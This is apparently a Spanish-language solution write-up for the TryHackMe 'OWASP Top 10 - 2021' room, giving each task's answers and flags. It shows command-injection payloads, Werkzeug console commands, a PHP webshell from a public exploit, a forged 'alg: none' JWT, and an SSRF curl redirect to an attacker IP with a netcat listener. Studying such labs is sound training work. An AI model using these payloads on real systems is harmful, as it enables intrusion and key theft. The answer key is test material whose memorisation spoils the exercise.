# OWASP Top 10 - 2021

| **Dificultad** | Easy |
| **Tipo** | Laboratorio guiado de las 10 principales vulnerabilidades web de OWASP (versión 2021) |
| **Slug** | `owasptop102021` |
| **Link** | [TryHackMe](https://tryhackme.com/room/owasptop102021) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | cowsay + command injection (`$(...)`), /etc/passwd, Alpine Linux, sqlite3 y `webapp.db` (hash MD5 del admin), crackstation, IDOR (`note_id=`), reset de contraseña con pregunta fácil (joseph), consola Werkzeug (`/console`), nostromo 1.9.6 (CVE-2019-16278), Online Book Store 1.0 (exploit 47887.py), bypass de autenticación con espacio en blanco (darren/arthur), SRI (subresource integrity) y jQuery, JWT con `alg:none`, cookie `jwt-session`, logs de login (`login-logs.txt`), SSRF (`download?server=`), netcat y curl |
| **Impacto** | Recorrido completo por los A01-A10 de OWASP 2021: control de acceso roto (IDOR), criptografía débil (base de datos `webapp.db` descargable con hash MD5 del admin), inyección (command injection en cowsay), diseño inseguro (reset de contraseña adivinable), mala configuración (consola de depuración Werkzeug expuesta → ejecución de comandos), componentes vulnerables (nostromo y Online Book Store → RCE), fallos de autenticación (registro con espacio en blanco), fallos de integridad (SRI y JWT con `alg: none`), falta de registro y monitoreo (log de fuerza bruta) y SSRF (fuga de la API key). |

---

**Contexto:** Sala que divide el OWASP Top 10 2021 en sus diez categorías (A01-A10) con teoría y retos prácticos por cada bloque. A01 se trabaja con un IDOR en una app de notas (`note_id=0`); A02 descargando la base de datos SQLite `webapp.db` y descifrando el hash MD5 del admin (`qwertyuiop`); A03 ejecutando comandos a través del servidor `cowsay` (payloads `$(...)`); A04 con un mecanismo de reset de contraseñas vulnerable (pregunta secreta adivinable, cuenta de joseph); A05 abusando de la consola Werkzeug en `/console` (flag en `app.py`, `todo.db`); A06 explotando el RCE de nostromo (CVE-2019-16278) y Online Book Store 1.0 (`47887.py`) para leer `/opt/flag.txt`; A07 con el registro de usuario con espacio inicial (` darren`/` arthur`); A08 con SRI (hash de jQuery) y el ataque JWT `alg: none` (cookie `jwt-session`); A09 analizando `login-logs.txt` (fuerza bruta desde `49.99.13.16`); y A10 con SSRF redirigiendo el parámetro `server` para capturar la `X-API-KEY` con netcat.

## Solucionario

### Task 1: Introduction

**Explicación:** Presenta la estructura de la sala: cada tema de OWASP se explica con teoría y se practica con desafíos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción de la sala. | `No answer needed` |

### Task 2: Accessing Machines

**Explicación:** Cómo acceder a las máquinas desplegadas: OpenVPN o la máquina Linux en el navegador (AttackBox).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Arranca la máquina virtual y despliega la primera máquina. | `No answer needed` |

### Task 3: 1. Broken Access Control

**Explicación:** Teoría de A01: el control de acceso roto permite a un visitante normal acceder a páginas protegidas o a información de otros usuarios.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría del control de acceso roto. | `No answer needed` |

### Task 4: Broken Access Control (IDOR Challenge)

**Explicación:** Se despliega la máquina y se accede a `http://IP` con `noot:test1234`. Viendo las notas propias, la URL tiene `?note_id=1`; cambiando a `note_id=0` se lee la nota de otro usuario y aparece la flag (IDOR por referencia directa sin validación de propiedad).

```http
http://IP/note.php?note_id=0
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina. | `No answer needed` |
| 2 | Inicia sesión con `noot:test1234`. | `No answer needed` |
| 3 | Mira las notas de otros usuarios. ¿Cuál es la flag? | `flag{fivefourthree}` |

### Task 5: 2. Cryptographic Failures

**Explicación:** Teoría de A02: datos en tránsito o en reposo sin cifrado, o almacenados con algoritmos débiles; la app del desafío guarda la base de datos accesible por la web.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de los fallos criptográficos. | `No answer needed` |

### Task 6: Cryptographic Failures (Supporting Material 1)

**Explicación:** Material de apoyo: bases de datos planas SQLite consultables con `sqlite3` (`.tables`, `PRAGMA table_info`, `SELECT * FROM customers;`).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Revisa el material de apoyo sobre SQLite. | `No answer needed` |

### Task 7: Cryptographic Failures (Supporting Material 2)

**Explicación:** Material de apoyo sobre cracking de hashes: herramientas locales (john) o servicios como Crackstation para hashes MD5 débiles.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Revisa el material de apoyo sobre cracking de hashes. | `No answer needed` |

### Task 8: Cryptographic Failures (Challenge)

**Explicación:** En `http://IP:81` el código fuente de `/login` contiene el comentario del developer: *"Must remember to do something better with the database than store it in /assets..."*. En `/assets` está `webapp.db`; con sqlite3 se lista la tabla `users`, donde el admin tiene el hash MD5 `6eea9b7ef19179a06954edd0f6c05ceb`, que Crackstation/John descifran a `qwertyuiop`. Con esas credenciales se hace login como admin y se obtiene la flag.

```bash
sqlite3 webapp.db
.tables            # sessions users
SELECT * FROM users;  # admin|6eea9b7ef19179a06954edd0f6c05ceb|1
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del directorio mencionado en la nota del developer? | `/assets` |
| 2 | Navega al directorio. ¿Qué archivo destaca como candidato a contener datos sensibles? | `webapp.db` |
| 3 | Accede a los datos sensibles. ¿Cuál es el hash de la contraseña del admin? | `6eea9b7ef19179a06954edd0f6c05ceb` |
| 4 | Descifra el hash. ¿Cuál es la contraseña del admin en texto plano? | `qwertyuiop` |
| 5 | Inicia sesión como admin. ¿Cuál es la flag? | `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}` |

### Task 9: 3. Injection

**Explicación:** Teoría de A03: inyección SQL y de comandos cuando la entrada del usuario se interpreta como instrucciones.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de la inyección. | `No answer needed` |

### Task 10: 3.1 Command Injection

**Explicación:** En `http://IP:82` el servidor `cowsay` pasa los parámetros a un `passthru` de PHP sin sanitizar. Con comandos en línea `$(...)` se ejecuta código arbitrario: `$(ls)` muestra `drpepper.txt`; `$(cat /etc/passwd)` demuestra que no hay usuarios normales (UID>=1000), por lo que hay `0` usuarios no-root/no-service/no-daemon; `$(id)` confirma `apache`; el shell en `/etc/passwd` es `/sbin/nologin`; y `$(cat /etc/alpine-release)` saca la versión `3.16.0` de Alpine Linux.

```bash
$(ls)
$(cat /etc/passwd)
$(id)                  # uid=100(apache)
$(cat /etc/alpine-release)
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué extraño archivo de texto está en el directorio raíz del sitio web? | `drpepper.txt` |
| 2 | ¿Cuántos usuarios hay que no sean root, ni de servicio, ni daemons? | `0` |
| 3 | ¿Con qué usuario se ejecuta la app? | `apache` |
| 4 | ¿Cuál es la shell configurada para ese usuario? | `/sbin/nologin` |
| 5 | ¿Qué versión de Alpine Linux está en uso? | `3.16.0` |

### Task 11: 4. Insecure Design

**Explicación:** En `http://IP:85` el mecanismo de reset de contraseña valida la identidad con una pregunta de seguridad ("¿Cuál es tu color favorito?"). Es un fallo de diseño: para joseph se puede adivinar el color (`Green - Success!`). Se resetea la contraseña a la temporal, se inicia sesión y se lee `Flag.txt` en `Private`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Intenta resetear la contraseña de joseph teniendo en cuenta el método de validación. | `No answer needed` |
| 2 | ¿Cuál es el valor de la flag en la cuenta de joseph? | `THM{Not_3ven_c4tz_c0uld_sav3_U!}` |

### Task 12: 5. Security Misconfiguration

**Explicación:** En `http://IP:86` la app Python (Flask/Werkzeug) dejó activa la consola de depuración en `/console`. Desde ella se ejecuta `import os; print(os.popen("ls -l").read())`, que muestra `todo.db`; y `import os; print(os.popen("grep 'THM' app.py").read())`, que revela la variable `secret_flag`.

```python
import os; print(os.popen("ls -l").read())
import os; print(os.popen("grep 'THM' app.py").read())
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Navega a http://IP:86/console para acceder a la consola Werkzeug. | `No answer needed` |
| 2 | ¿Cuál es el nombre del archivo de base de datos (extensión .db) del directorio actual? | `todo.db` |
| 3 | Lee `app.py`. ¿Cuál es el valor de la variable `secret_flag`? | `THM{Just_a_tiny_misconfiguration}` |

### Task 13: 6. Vulnerable and Outdated Components

**Explicación:** Teoría de A06: usar software con vulnerabilidades conocidas permite explotar con scripts ya publicados (Exploit-DB).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de componentes vulnerables y obsoletos. | `No answer needed` |

### Task 14: Vulnerable and Outdated Components - Exploit

**Explicación:** El servidor web del ejemplo es Nostromo 1.9.6. En Exploit-DB existe el exploit `47837.py` (CVE-2019-16278); el script trae una línea de más (`cve2019_16278.py`) que hay que comentar para corregir el `NameError`. Tras arreglarlo, `python2 47837.py IP 80 id` devuelve `uid=1001(_nostromo)` (RCE).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sigue el ejemplo de explotación de nostromo. | `No answer needed` |

### Task 15: Vulnerable and Outdated Components - Lab

**Explicación:** En `http://IP:84` se ejecuta "Online Book Store 1.0" (de projectworlds). Sobre `http://IP:84/admin_add.php` el exploit `47887.py` sube una webshell PHP (`<?php echo shell_exec($_GET['cmd']); ?>`) a `/bootstrap/img/<aleatorio>.php` (RCE sin autenticación). Con `cat /opt/flag.txt` se obtiene la flag.

```bash
python 47887.py http://IP:84/
RCE $ cat /opt/flag.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el contenido del archivo /opt/flag.txt? | `THM{But_1ts_n0t_my_f4ult!}` |

### Task 16: 7. Identification and Authentication Failures

**Explicación:** Teoría de A07: fuerza bruta, credenciales débiles y cookies de sesión predecibles rompen la autenticación.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de los fallos de autenticación. | `No answer needed` |

### Task 17: Identification and Authentication Failures Practical

**Explicación:** En `http://IP:8088` se intenta registrar `darren` pero la cuenta ya existe. El fallo lógico: registrarse como `" darren"` (con un espacio inicial). La app devuelve los usuarios normalizados con el espacio, pero al login recupera la cuenta existente `darren`. Así se entra en la cuenta de darren y se lee su flag; la misma técnica con `" arthur"` da la flag de arthur.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué flag encontraste en la cuenta de darren? | `fe86079416a21a3c99937fea8874b667` |
| 2 | Aplica el truco del espacio en blanco para iniciar sesión. | `No answer needed` |
| 3 | Aplica el mismo truco con arthur. ¿Qué flag encontraste en su cuenta? | `d9ac0f7db4fda460ac3edeb75d75e16e` |

### Task 18: 8. Software and Data Integrity Failures

**Explicación:** Teoría de A08: la integridad se comprueba con hashes; los fallos ocurren cuando el software o los datos se usan sin verificación (librerías de terceros, tokens).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la teoría de los fallos de integridad. | `No answer needed` |

### Task 19: Software Integrity Failures

**Explicación:** Subresource Integrity (SRI): sin `integrity` en el `<script>`, una librería externa (p. ej., jQuery) manipulada se ejecutaría tal cual. La herramienta SRIHash (`https://www.srihash.org/`) calcula el hash sha256 del archivo de la URL.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el hash SHA-256 de `https://code.jquery.com/jquery-1.12.4.min.js`? | `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=` |

### Task 20: Data Integrity Failures

**Explicación:** En `http://IP:8089` se hace login con credenciales incorrectas: la respuesta indica que se accede como user `guest` con password `guest`. Al entrar, la cookie `jwt-session` guarda el JWT; con `jwt.one` se decodifica y se manipula: `alg` → `none`, `username` → `admin` y se elimina la firma. Reemplazando la cookie y recargando, la app (vulnerable al ataque del algoritmo *none*) trata al usuario como admin y da la flag.

```text
JWT manipulado: eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ1OTQ0NTU0fQ.
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Intenta iniciar sesión en la aplicación como guest. ¿Cuál es la contraseña de la cuenta guest? | `guest` |
| 2 | ¿Cuál es el nombre de la cookie que contiene el token JWT? | `jwt-session` |
| 3 | Modifica el JWT para que la app piense que eres el usuario admin. | `No answer needed` |
| 4 | ¿Cuál es la flag presentada al usuario admin? | `THM{Dont_take_cookies_from_strangers}` |

### Task 21: 9. Security Logging and Monitoring Failures

**Explicación:** Se analiza `login-logs.txt`: entradas `200 OK` normales y, hacia el final, una ráfaga de `401 Unauthorised` desde la misma IP `49.99.13.16` probando distintos usuarios (`admin`, `administrator`, `anonymous`, `root`) en segundos. Es un ataque de fuerza bruta (cunning de combinaciones usuario/contraseña).

```
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué IP está usando el atacante? | `49.99.13.16` |
| 2 | ¿Qué tipo de ataque se está llevando a cabo? | `Brute Force` |

### Task 22: 10. Server-Side Request Forgery (SSRF)

**Explicación:** En `http://IP:8087`, el área `/admin` responde `Admin interface only available from localhost!!!` (solo localhost). El botón "Download Resume" apunta a `http://IP:8087/download?server=secure-file-storage.com:8087&id=75482342`, con el parámetro `server` controlado por el usuario. Redirigiendo `server` hacía la máquina del atacante y escuchando con netcat, la app reenvía la petición con la cabecera `X-API-KEY: THM{Hello_Im_just_an_API_key}` — la clave del servicio SMS que la app usaba.

```bash
nc -lvnp 12345
curl 'http://IP:8087/download?server=10.14.61.233:12345&id=75482342'
# Recibido: GET /public-docs-.../75482342.pdf HTTP/1.1
#           X-API-KEY: THM{Hello_Im_just_an_API_key}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Explora el sitio. ¿Qué host es el único permitido para acceder al área de administración? | `localhost` |
| 2 | Revisa el botón "Download Resume". ¿A dónde apunta el parámetro `server`? | `secure-file-storage.com` |
| 3 | Con el SSRF, haz que la app envíe la petición a tu AttackBox. ¿Hay claves de API en la petición interceptada? | `THM{Hello_Im_just_an_API_key}` |
| 4 | (Extra) Usa el SSRF para llegar al área administrativa. | `No answer needed` |

### Task 23: Conclusion

**Explicación:** Resumen de los diez riesgos principales de OWASP 2021 trabajados en la sala.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la conclusión. | `No answer needed` |

---

**Metodología:** La sala se recorre categoría a categoría: (1) IDOR enumerando `note_id`; (2) descarga de la base de datos SQLite y cracking del hash MD5 del admin en crackstation; (3) command injection en el servidor cowsay con `$(...)` y enumeración del sistema (Alpine); (4) reset de contraseña por pregunta de seguridad adivinable; (5) consola Werkzeug de debug para ejecutar comandos Python; (6) RCE sobre componentes con exploits públicos (nostromo CVE-2019-16278 y Online Book Store 47887.py); (7) bypass de autenticación re-registrando usuarios con espacio; (8) integridad con hashes SRI y ataque JWT `alg: none`; (9) análisis de logs para identificar fuerza bruta; (10) SSRF redirigiendo `server` para capturar la API key con netcat. Cada paso se valida con comandos y payloads reproducibles.
**Learning chain:** IDOR → sqlite + cracking de MD5 → command injection → diseño inseguro (reset) → consola de depuración → RCE en componentes → auth bypass por espaciado → SRI y JWT none → lectura de logs → SSRF/exfiltración de API key.
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059.006 (Command and Scripting Interpreter: Python), T1078 (Valid Accounts), T1212 (Exploitation for Credential Access), T1606.001 (Web Session Cookie), T1110 (Brute Force), T1005 (Data from Local System), T1041 (Exfiltration Over C2 Channel), T1206? no aplica → cubre A01-A10 de OWASP.
**Fuente:** [TryHackMe - OWASP Top 10 - 2021](https://tryhackme.com/room/owasptop102021)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
